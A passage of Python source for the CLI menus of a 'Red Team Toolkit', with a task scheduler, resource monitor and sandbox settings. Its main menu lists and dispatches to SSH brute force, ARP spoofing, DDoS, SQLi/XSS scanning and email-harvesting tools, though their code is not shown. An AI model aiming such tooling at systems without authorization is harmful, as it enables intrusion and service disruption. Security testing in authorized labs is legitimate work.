    
    try:
        with open(plugin_path, 'w') as f:
            f.write(template_content)
        
        cli_manager.print_panel(f"✅ Created plugin template: {plugin_path}", "green")
        cli_manager.console.print(f"Template created at: {plugin_path}")
        cli_manager.console.print("Edit the file to add your custom functionality!")
        
    except Exception as e:
        cli_manager.print_panel(f"❌ Failed to create plugin template: {e}", "red")


def task_scheduler_menu():
    """Task scheduler menu for managing scheduled tasks."""
    while True:
        cli_manager.print_panel("⏰ Task Scheduler System", "blue")
        
        scheduled_tasks = task_scheduler.list_scheduled_tasks()
        task_history = task_scheduler.list_task_history(10)
        
        options = [
            (1, "List Scheduled Tasks", f"Currently scheduled: {len(scheduled_tasks)}"),
            (2, "Schedule New Task", "Create a new scheduled task"),
            (3, "Run Task Once", "Execute a task immediately"),
            (4, "Cancel Task", "Remove a scheduled task"),
            (5, "Task History", f"Recent executions: {len(task_history)}"),
            (6, "Scheduler Status", "View scheduler status and controls"),
            (0, "Back to Main Menu", "Return to main menu")
        ]
        
        cli_manager.print_menu(options)
        choice = cli_manager.get_choice("Select an option")
        
        if not choice:
            continue
        
        if choice == "0":
            break
        elif choice == "1":
            _list_scheduled_tasks(scheduled_tasks)
        elif choice == "2":
            _schedule_new_task()
        elif choice == "3":
            _run_task_once()
        elif choice == "4":
            _cancel_task_menu(scheduled_tasks)
        elif choice == "5":
            _show_task_history(task_history)
        elif choice == "6":
            _scheduler_status_menu()


def _list_scheduled_tasks(scheduled_tasks):
    """List all scheduled tasks."""
    if not scheduled_tasks:
        cli_manager.print_panel("No tasks currently scheduled", "yellow")
        return
    
    table = Table(title="Scheduled Tasks")
    table.add_column("Task Name", style="cyan")
    table.add_column("Interval", style="green")
    table.add_column("Created", style="blue")
    table.add_column("Last Run", style="yellow")
    table.add_column("Runs", style="magenta")
    
    for task_name, task_info in scheduled_tasks.items():
        last_run = task_info.get('last_run', 'Never')
        if last_run != 'Never':
            last_run = last_run.strftime('%Y-%m-%d %H:%M:%S')
        
        table.add_row(
            task_name,
            str(task_info.get('interval', 'N/A')),
            task_info.get('created', 'N/A').strftime('%Y-%m-%d %H:%M:%S'),
            last_run,
            str(task_info.get('runs_count', 0))
        )
    
    cli_manager.console.print(table)


def _schedule_new_task():
    """Schedule a new task."""
    cli_manager.print_panel("Available Built-in Tasks:", "blue")
    
    builtin_tasks = {
        "port_scan": ("Port Scanner", port_scanner),
        "network_scan": ("Network Mapper", network_mapper),
        "dns_enum": ("DNS Tools", dns_tools),
        "web_scan": ("Web Vulnerability Scanner", web_vulnerability_scanner),
        "hash_gen": ("Hash Generator", hash_generator)
    }
    
    for i, (task_id, (task_name, task_func)) in enumerate(builtin_tasks.items(), 1):
        cli_manager.console.print(f"{i}. {task_name} ({task_id})")
    
    choice = cli_manager.get_choice("Select task number")
    if not choice or not choice.isdigit():
        return
    
    try:
        task_index = int(choice) - 1
        task_items = list(builtin_tasks.items())
        if 0 <= task_index < len(task_items):
            task_id, (task_name, task_func) = task_items[task_index]
            
            # Get task parameters
            target = cli_manager.get_input("Enter target (IP/hostname)")
            if not target:
                return
            
            # Get interval
            cli_manager.print_panel("Interval Options:", "blue")
            cli_manager.console.print("1. Every X seconds")
            cli_manager.console.print("2. Every X minutes")
            cli_manager.console.print("3. Every X hours")
            cli_manager.console.print("4. Daily")
            cli_manager.console.print("5. Weekly")
            
            interval_choice = cli_manager.get_choice("Select interval type")
            if not interval_choice:
                return
            
            interval = None
            if interval_choice == "1":
                seconds = cli_manager.get_input("Enter number of seconds")
                if seconds and seconds.isdigit():
                    interval = int(seconds)
            elif interval_choice == "2":
                minutes = cli_manager.get_input("Enter number of minutes")
                if minutes and minutes.isdigit():
                    interval = f"{minutes} minutes"
            elif interval_choice == "3":
                hours = cli_manager.get_input("Enter number of hours")
                if hours and hours.isdigit():
                    interval = f"{hours} hours"
            elif interval_choice == "4":
                interval = "daily"
            elif interval_choice == "5":
                interval = "weekly"
            
            if interval:
                task_name_full = f"{task_name}_{target}"
                if task_scheduler.schedule_task(task_name_full, task_func, interval, target):
                    cli_manager.print_panel(f"✅ Task scheduled: {task_name_full}", "green")
                else:
                    cli_manager.print_panel("❌ Failed to schedule task", "red")
            else:
                cli_manager.print_panel("Invalid interval", "red")
        else:
            cli_manager.print_panel("Invalid task number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _run_task_once():
    """Run a task once immediately."""
    cli_manager.print_panel("Available Built-in Tasks:", "blue")
    
    builtin_tasks = {
        "port_scan": ("Port Scanner", port_scanner),
        "network_scan": ("Network Mapper", network_mapper),
        "dns_enum": ("DNS Tools", dns_tools),
        "web_scan": ("Web Vulnerability Scanner", web_vulnerability_scanner),
        "hash_gen": ("Hash Generator", hash_generator)
    }
    
    for i, (task_id, (task_name, task_func)) in enumerate(builtin_tasks.items(), 1):
        cli_manager.console.print(f"{i}. {task_name} ({task_id})")
    
    choice = cli_manager.get_choice("Select task number")
    if not choice or not choice.isdigit():
        return
    
    try:
        task_index = int(choice) - 1
        task_items = list(builtin_tasks.items())
        if 0 <= task_index < len(task_items):
            task_id, (task_name, task_func) = task_items[task_index]
            
            # Get task parameters
            target = cli_manager.get_input("Enter target (IP/hostname)")
            if not target:
                return
            
            task_name_full = f"{task_name}_{target}_once"
            if task_scheduler.run_once(task_name_full, task_func, target):
                cli_manager.print_panel(f"✅ Task executed: {task_name_full}", "green")
            else:
                cli_manager.print_panel("❌ Task execution failed", "red")
        else:
            cli_manager.print_panel("Invalid task number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _cancel_task_menu(scheduled_tasks):
    """Menu for canceling scheduled tasks."""
    if not scheduled_tasks:
        cli_manager.print_panel("No tasks to cancel", "yellow")
        return
    
    cli_manager.print_panel("Select a task to cancel:", "blue")
    for i, task_name in enumerate(scheduled_tasks.keys(), 1):
        cli_manager.console.print(f"{i}. {task_name}")
    
    choice = cli_manager.get_choice("Enter task number")
    if not choice or not choice.isdigit():
        return
    
    try:
        task_index = int(choice) - 1
        task_names = list(scheduled_tasks.keys())
        if 0 <= task_index < len(task_names):
            task_name = task_names[task_index]
            if cli_manager.confirm_action(f"Are you sure you want to cancel {task_name}?"):
                if task_scheduler.cancel_task(task_name):
                    cli_manager.print_panel(f"✅ Task cancelled: {task_name}", "green")
                else:
                    cli_manager.print_panel(f"❌ Failed to cancel task: {task_name}", "red")
        else:
            cli_manager.print_panel("Invalid task number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _show_task_history(task_history):
    """Show recent task execution history."""
    if not task_history:
        cli_manager.print_panel("No task history available", "yellow")
        return
    
    table = Table(title="Recent Task History")
    table.add_column("Task Name", style="cyan")
    table.add_column("Start Time", style="green")
    table.add_column("End Time", style="blue")
    table.add_column("Status", style="yellow")
    
    for task in task_history:
        status = "✅ Success" if task.get('success', False) else "❌ Failed"
        start_time = task.get('start_time', 'N/A')
        if start_time != 'N/A':
            start_time = start_time.strftime('%Y-%m-%d %H:%M:%S')
        
        end_time = task.get('end_time', 'N/A')
        if end_time != 'N/A':
            end_time = end_time.strftime('%Y-%m-%d %H:%M:%S')
        
        table.add_row(
            task.get('task_name', 'Unknown'),
            start_time,
            end_time,
            status
        )
    
    cli_manager.console.print(table)


def _scheduler_status_menu():
    """Show scheduler status and controls."""
    cli_manager.print_panel("Scheduler Status", "blue")
    
    status_table = Table()
    status_table.add_column("Property", style="cyan")
    status_table.add_column("Value", style="green")
    
    status_table.add_row("Scheduler Running", str(task_scheduler.is_running))
    status_table.add_row("Scheduled Tasks", str(len(task_scheduler.scheduled_tasks)))
    status_table.add_row("Task History Entries", str(len(task_scheduler.task_history)))
    
    cli_manager.console.print(status_table)
    
    # Scheduler controls
    cli_manager.print_panel("Scheduler Controls:", "blue")
    cli_manager.console.print("1. Start Scheduler")
    cli_manager.console.print("2. Stop Scheduler")
    
    choice = cli_manager.get_choice("Select control")
    if choice == "1":
        task_scheduler.start_scheduler()
        cli_manager.print_panel("✅ Scheduler started", "green")
    elif choice == "2":
        task_scheduler.stop_scheduler()
        cli_manager.print_panel("✅ Scheduler stopped", "green")


def resource_monitor_menu():
    """Resource monitoring menu."""
    while True:
        cli_manager.print_panel("📊 Resource Monitor", "blue")
        
        options = [
            (1, "Current Resource Status", "Display current CPU, memory, and disk usage"),
            (2, "Resource History", "View resource usage history"),
            (3, "Resource Summary", "Show resource usage statistics"),
            (4, "Toggle Monitoring", "Enable/disable resource monitoring"),
            (5, "Export Resource Data", "Export resource data to file"),
            (0, "Back to Main Menu", "Return to main menu")
        ]
        
        cli_manager.print_menu(options)
        choice = cli_manager.get_choice("Select an option")
        
        if not choice:
            continue
        
        if choice == "0":
            break
        elif choice == "1":
            plugin_manager.resource_monitor.display_resource_status()
        elif choice == "2":
            _show_resource_history()
        elif choice == "3":
            _show_resource_summary()
        elif choice == "4":
            _toggle_resource_monitoring()
        elif choice == "5":
            _export_resource_data()


def _show_resource_history():
    """Show resource usage history."""
    history = plugin_manager.resource_monitor.resource_history
    
    if not history:
        cli_manager.print_panel("No resource history available", "yellow")
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="Resource Usage History")
        table.add_column("Timestamp", style="cyan")
        table.add_column("Operation", style="green")
        table.add_column("CPU %", style="blue")
        table.add_column("Memory %", style="yellow")
        table.add_column("Disk %", style="magenta")
        
        # Show last 10 entries
        for entry in history[-10:]:
            timestamp = entry.get('timestamp', 'N/A')
            operation = entry.get('operation', 'Unknown')
            cpu = entry.get('cpu_percent', 0)
            memory = entry.get('memory_percent', 0)
            disk = entry.get('disk_usage', 0)
            
            table.add_row(
                timestamp[:19],  # Truncate timestamp
                operation,
                f"{cpu:.1f}%",
                f"{memory:.1f}%",
                f"{disk:.1f}%"
            )
        
        cli_manager.console.print(table)
    else:
        print("Resource History (Last 10 entries):")
        for entry in history[-10:]:
            print(f"  {entry.get('operation', 'Unknown')}: CPU {entry.get('cpu_percent', 0):.1f}%, "
                  f"Memory {entry.get('memory_percent', 0):.1f}%")


def _show_resource_summary():
    """Show resource usage summary."""
    summary = plugin_manager.resource_monitor.get_resource_summary()
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="Resource Usage Summary")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("Current CPU", f"{summary['current_cpu']:.1f}%")
        table.add_row("Current Memory", f"{summary['current_memory']:.1f}%")
        table.add_row("Average CPU", f"{summary['avg_cpu']:.1f}%")
        table.add_row("Average Memory", f"{summary['avg_memory']:.1f}%")
        table.add_row("Max CPU", f"{summary['max_cpu']:.1f}%")
        table.add_row("Max Memory", f"{summary['max_memory']:.1f}%")
        table.add_row("Total Operations", str(summary['total_operations']))
        
        cli_manager.console.print(table)
    else:
        print(f"Resource Summary:")
        print(f"  Current CPU: {summary['current_cpu']:.1f}%")
        print(f"  Current Memory: {summary['current_memory']:.1f}%")
        print(f"  Average CPU: {summary['avg_cpu']:.1f}%")
        print(f"  Average Memory: {summary['avg_memory']:.1f}%")
        print(f"  Max CPU: {summary['max_cpu']:.1f}%")
        print(f"  Max Memory: {summary['max_memory']:.1f}%")
        print(f"  Total Operations: {summary['total_operations']}")


def _toggle_resource_monitoring():
    """Toggle resource monitoring on/off."""
    current_status = plugin_manager.resource_monitor.monitoring_enabled
    
    if current_status:
        if cli_manager.confirm_action("Disable resource monitoring?"):
            plugin_manager.resource_monitor.monitoring_enabled = False
            cli_manager.print_panel("Resource monitoring disabled", "yellow")
        else:
            cli_manager.print_panel("Resource monitoring remains enabled", "green")
    else:
        if cli_manager.confirm_action("Enable resource monitoring?"):
            plugin_manager.resource_monitor.monitoring_enabled = True
            cli_manager.print_panel("Resource monitoring enabled", "green")
        else:
            cli_manager.print_panel("Resource monitoring remains disabled", "yellow")


def _export_resource_data():
    """Export resource data to file."""
    history = plugin_manager.resource_monitor.resource_history
    
    if not history:
        cli_manager.print_panel("No resource data to export", "yellow")
        return
    
    filename = f"resource_data_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = Path("reports") / filename
    
    try:
        filepath.parent.mkdir(exist_ok=True)
        
        with open(filepath, 'w') as f:
            json.dump(history, f, indent=2)
        
        cli_manager.print_panel(f"Resource data exported to: {filepath}", "green")
        
    except Exception as e:
        cli_manager.print_panel(f"Failed to export resource data: {e}", "red")


def sandbox_mode_menu():
    """Sandbox mode management menu."""
    while True:
        cli_manager.print_panel("🛡️ Sandbox Mode Management", "blue")
        
        safety_info = sandbox_mode.get_safety_info()
        
        options = [
            (1, "Sandbox Status", f"Currently {'enabled' if safety_info['sandbox_enabled'] else 'disabled'}"),
            (2, "Toggle Sandbox Mode", "Enable/disable sandbox mode"),
            (3, "Lab Networks", f"Configured: {len(safety_info['lab_networks'])} networks"),
            (4, "Safety Settings", "View and modify safety limits"),
            (5, "Test Safety Check", "Test safety validation for an operation"),
            (6, "Dangerous Tools Info", "View information about dangerous tools"),
            (0, "Back to Main Menu", "Return to main menu")
        ]
        
        cli_manager.print_menu(options)
        choice = cli_manager.get_choice("Select an option")
        
        if not choice:
            continue
        
        if choice == "0":
            break
        elif choice == "1":
            _show_sandbox_status(safety_info)
        elif choice == "2":
            _toggle_sandbox_mode()
        elif choice == "3":
            _manage_lab_networks(safety_info['lab_networks'])
        elif choice == "4":
            _manage_safety_settings(safety_info['safety_checks'])
        elif choice == "5":
            _test_safety_check()
        elif choice == "6":
            _show_dangerous_tools_info()


def _show_sandbox_status(safety_info):
    """Show current sandbox status."""
    cli_manager.print_panel("Sandbox Mode Status", "blue")
    
    status_table = Table()
    status_table.add_column("Setting", style="cyan")
    status_table.add_column("Value", style="green")
    
    status_table.add_row("Sandbox Enabled", str(safety_info['sandbox_enabled']))
    status_table.add_row("Lab Networks", str(len(safety_info['lab_networks'])))
    status_table.add_row("Destructive Operations", str(len(safety_info['destructive_operations'])))
    status_table.add_row("Safety Checks", str(len(safety_info['safety_checks'])))
    
    cli_manager.console.print(status_table)
    
    # Show destructive operations
    cli_manager.print_panel("Destructive Operations:", "blue")
    for operation, restricted in safety_info['destructive_operations'].items():
        status = "🔒 Restricted" if restricted else "✅ Allowed"
        cli_manager.console.print(f"• {operation}: {status}")


def _toggle_sandbox_mode():
    """Toggle sandbox mode on/off."""
    current_status = sandbox_mode.is_sandbox_enabled()
    
    if current_status:
        if cli_manager.confirm_action("Are you sure you want to disable sandbox mode? This allows destructive operations."):
            sandbox_mode.disable_sandbox()
            cli_manager.print_panel("⚠️ Sandbox mode disabled - destructive operations allowed", "red")
        else:
            cli_manager.print_panel("Sandbox mode remains enabled", "green")
    else:
        if cli_manager.confirm_action("Enable sandbox mode?"):
            sandbox_mode.enable_sandbox()
            cli_manager.print_panel("✅ Sandbox mode enabled", "green")
        else:
            cli_manager.print_panel("Sandbox mode remains disabled", "yellow")


def _manage_lab_networks(lab_networks):
    """Manage lab network configurations."""
    while True:
        cli_manager.print_panel("Lab Networks Management", "blue")
        
        cli_manager.print_panel("Current Lab Networks:", "blue")
        for i, network in enumerate(lab_networks, 1):
            cli_manager.console.print(f"{i}. {network}")
        
        options = [
            (1, "Add Network", "Add a new lab network"),
            (2, "Remove Network", "Remove a lab network"),
            (0, "Back", "Return to sandbox menu")
        ]
        
        cli_manager.print_menu(options)
        choice = cli_manager.get_choice("Select an option")
        
        if choice == "0":
            break
        elif choice == "1":
            network = cli_manager.get_input("Enter network (e.g., 192.168.1.0/24)")
            if network:
                sandbox_mode.add_lab_network(network)
        elif choice == "2":
            if lab_networks:
                cli_manager.print_panel("Select network to remove:", "blue")
                for i, network in enumerate(lab_networks, 1):
                    cli_manager.console.print(f"{i}. {network}")
                
                choice = cli_manager.get_choice("Enter network number")
                if choice and choice.isdigit():
                    try:
                        network_index = int(choice) - 1
                        if 0 <= network_index < len(lab_networks):
                            network = lab_networks[network_index]
                            sandbox_mode.remove_lab_network(network)
                    except ValueError:
                        cli_manager.print_panel("Invalid input", "red")


def _manage_safety_settings(safety_checks):
    """Manage safety check settings."""
    cli_manager.print_panel("Safety Settings", "blue")
    
    settings_table = Table()
    settings_table.add_column("Setting", style="cyan")
    settings_table.add_column("Current Value", style="green")
    settings_table.add_column("Description", style="blue")
    
    settings_table.add_row("Max Scan Targets", str(safety_checks['max_scan_targets']), "Maximum targets for network scans")
    settings_table.add_row("Max Brute Force Attempts", str(safety_checks['max_brute_force_attempts']), "Maximum brute force attempts")
    settings_table.add_row("Max File Size", f"{safety_checks['max_file_size'] // (1024*1024)}MB", "Maximum file size for operations")
    settings_table.add_row("Max Network Operations", str(safety_checks['max_network_operations']), "Maximum network operations")
    
    cli_manager.console.print(settings_table)
    
    cli_manager.print_panel("Note: Safety settings are currently read-only for security", "yellow")


def _test_safety_check():
    """Test safety validation for an operation."""
    cli_manager.print_panel("Test Safety Check", "blue")
    
    cli_manager.print_panel("Available Operations:", "blue")
    operations = [
        "ddos_simulator",
        "arp_spoofing", 
        "brute_force",
        "file_deletion",
        "network_scanning",
        "web_testing"
    ]
    
    for i, operation in enumerate(operations, 1):
        cli_manager.console.print(f"{i}. {operation}")
    
    choice = cli_manager.get_choice("Select operation")
    if not choice or not choice.isdigit():
        return
    
    try:
        operation_index = int(choice) - 1
        if 0 <= operation_index < len(operations):
            operation = operations[operation_index]
            
            target = cli_manager.get_input("Enter target (IP/hostname)")
            
            # Test safety check
            is_safe = sandbox_mode.check_operation_safety(operation, target)
            
            if is_safe:
                cli_manager.print_panel(f"✅ Operation '{operation}' is safe for target '{target}'", "green")
            else:
                cli_manager.print_panel(f"❌ Operation '{operation}' is NOT safe for target '{target}'", "red")
        else:
            cli_manager.print_panel("Invalid operation number", "red")
    except ValueError:
        cli_manager.print_panel("Invalid input", "red")


def _show_dangerous_tools_info():
    """Show information about dangerous tools."""
    cli_manager.print_panel("Dangerous Tools Information", "red")
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="⚠️  Dangerous Tools - Use with Extreme Caution")
        table.add_column("Tool", style="red")
        table.add_column("Description", style="yellow")
        table.add_column("Safety Requirements", style="cyan")
        
        for tool, description in sandbox_mode.dangerous_tools.items():
            table.add_row(tool, description, "Lab environment only")
        
        cli_manager.console.print(table)
        
        cli_manager.print_panel("⚠️  WARNING: These tools can cause damage if used incorrectly!", "red")
        cli_manager.console.print("• Always use in controlled lab environments")
        cli_manager.console.print("• Ensure you have proper authorization")
        cli_manager.console.print("• Monitor system resources during execution")
        cli_manager.console.print("• Sandbox mode is enabled by default for safety")
    else:
        print("⚠️  DANGEROUS TOOLS - Use with Extreme Caution:")
        for tool, description in sandbox_mode.dangerous_tools.items():
            print(f"  {tool}: {description}")
        print("\n⚠️  WARNING: These tools can cause damage if used incorrectly!")
        print("• Always use in controlled lab environments")
        print("• Ensure you have proper authorization")
        print("• Monitor system resources during execution")
        print("• Sandbox mode is enabled by default for safety")


def main_menu():
    """Enhanced main menu for the Red Team Toolkit."""
    
    # Define tools with descriptions
    tools = [
        (1, "Port Scanner", "Multi-threaded port discovery and scanning"),
        (2, "Enhanced Payload Encoder/Decoder", "Base64, URL, hex, ROT13 & multiple formats"),
        (3, "Enhanced Hash Generator", "Comprehensive hash types & file support"),
        (4, "Enhanced Hash Identifier", "Auto-detection & comprehensive analysis"),
        (5, "DNS Tools", "DNS lookup, reverse lookup, and subdomain enumeration"),
        (6, "Enhanced Password Tools", "Entropy calculation, generation & wordlist mutation"),
        (7, "Banner Grabber", "Grab service banners from network hosts"),
        (8, "Wordlist Mutator", "Generate password variations for attacks"),
        (9, "Enhanced File Analyzer", "Advanced binary analysis & compression detection"),
        (10, "Enhanced File Metadata Extractor", "Comprehensive metadata extraction"),
        (11, "Network Sniffer", "Packet capture and network traffic analysis"),
        (12, "Enhanced ARP Spoofing Simulator", "Lab-only MITM test mode & safety features"),
        (13, "Enhanced Web Vulnerability Scanner", "Advanced SQLi/XSS testing with file upload detection"),
        (14, "Enhanced DDoS Simulator", "Thread-controlled load testing & safety features"),
        (15, "Enhanced SSH Brute Force Tool", "Thread pool with multi-username support"),
        (16, "Enhanced Web Scraper", "Multi-page scraping with email/URL harvesting"),
        (17, "Network Mapper", "Network discovery and host enumeration"),
        (18, "Enhanced Test Suite & QA", "Comprehensive testing and quality assurance system"),
        (19, "Configuration", "Settings and configuration management"),
        (20, "Enhanced Reporting System", "Comprehensive reporting and export capabilities"),
        (21, "Plugin Management System", "Load and manage external plugins"),
        (22, "Task Scheduler", "Schedule and manage automated tasks"),
        (23, "Sandbox Mode Management", "Configure safety and lab restrictions"),
        (24, "Resource Monitor", "Monitor system resources and performance"),
        (25, "Help", "Display help and usage information"),
        (26, "Bluetooth Tools", "Comprehensive Bluetooth scanning and testing"),
        (27, "Firewall/IDS Detection", "Test for firewall and IDS detection")
    ]
    
    while True:
        # Clear screen if configured
        if config.getboolean('CLI', 'auto_clear_screen', False):
            os.system('cls' if os.name == 'nt' else 'clear')
        
        # Display banner
        cli_manager.print_banner()
        
        # Display menu
        cli_manager.print_menu(tools)
        
        # Get user choice
        choice = cli_manager.get_choice("Select a tool")
        
        if not choice:
            continue
        
        if choice == "0":
            if cli_manager.confirm_exit:
                if not cli_manager.confirm_action("Are you sure you want to exit?"):
                    continue
            logger.info("User exited the toolkit")
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[green]Thank you for using Enhanced Red Team Toolkit v2.8![/green]")
            else:
                print(colored("Thank you for using Enhanced Red Team Toolkit v2.8!", Colors.OKGREEN))
            return
        
        # Execute tool based on choice
        tool_functions = {
            "1": port_scanner,
            "2": payload_encoder,
            "3": hash_generator,
            "4": hash_identifier,
            "5": dns_tools,
            "6": password_tools,
            "7": banner_grabber,
            "8": wordlist_mutator,
            "9": file_analyzer,
            "10": file_metadata_extractor,
            "11": network_sniffer,
            "12": arp_spoofing_simulator,
            "13": web_vulnerability_scanner,
            "14": ddos_simulator,
            "15": ssh_brute_force,
            "16": web_scraper,
            "17": network_mapper,
            "18": run_test_suite,
            "19": configuration_menu,
            "20": reporting_menu,
            "21": plugin_management_menu,
            "22": task_scheduler_menu,
            "23": sandbox_mode_menu,
            "24": resource_monitor_menu,
            "25": cli_manager.show_help,
            "26": bluetooth_tools_menu,
            "27": firewall_ids_detection
        }
        
        if choice in tool_functions:
            try:
                logger.info(f"User selected tool: {choice}")
                tool_functions[choice]()
            except KeyboardInterrupt:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print("[yellow]⚠️  Tool execution interrupted by user[/yellow]")
                else:
                    print(colored("⚠️  Tool execution interrupted by user", Colors.WARNING))
                logger.warning("Tool execution interrupted by user")
            except Exception as e:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"[red]❌ Error executing tool: {e}[/red]")
                else:
                    print(colored(f"❌ Error executing tool: {e}", Colors.FAIL))
                logger.error(f"Error executing tool {choice}: {e}")
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Invalid option. Please try again.[/red]")
            else:
                print(colored("Invalid option. Please try again.", Colors.FAIL))
        
        # Pause before returning to menu
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[dim]Press Enter to continue...[/dim]")
        else:
            input("\nPress Enter to continue...")


if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n\nToolkit interrupted. Goodbye!")
    except Exception as e:
        print(f"\nUnexpected error: {e}")
